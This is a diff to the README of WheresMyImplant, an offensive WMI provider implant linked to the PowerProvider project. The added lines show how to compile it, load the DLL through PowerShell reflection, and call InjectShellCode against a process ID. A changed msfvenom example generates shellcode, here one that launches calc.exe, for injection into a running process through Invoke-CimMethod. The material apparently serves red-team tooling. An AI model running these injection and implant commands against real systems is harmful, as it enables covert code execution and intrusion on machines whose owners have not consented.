@@ -5,6 +5,13 @@ This WMI provider includes functions to execute commands, payloads, and Empire A
 This is related to the project PowerProvider - https://github.com/0xbadjuju/PowerProvider/ <br/>
 PowerProvider provides the deployment methods for the implant.
 
+To compile, generate your signing key with the command: 
+sn -k sgKey.snk
+
+While primarily designed for use with WMI, WheresMyImplant can also be used with PowerShell reflection:
+[System.Reflection.Assembly]::LoadFile("C:\temp\WheresMyImplant.dll")
+[WheresMyImplant.Implant]::InjectShellCode($payload,9976)
+
 ### Methods
 
 * #### RunCMD
@@ -36,7 +43,8 @@ PowerProvider provides the deployment methods for the implant.
 * #### InjectShellCode
   * **Parameter:** ShellCodeString, ProcessId
   * **Example:** <br/>
-  msfvenom -p windows/x64/exec --format csharp CMD=calc.exe <br/>
+  msfvenom -p windows/x64/exec --format csharp CMD=calc.exe > file.txt<br/>
+  Delete the byte declaration. <br/>
   Invoke-CimMethod -Class Win32_Implant -Name InjectShellCode -Argument @{ <br/>
   &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;shellCodeString=$payload; <br/>
   &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;processId=432 <br/>
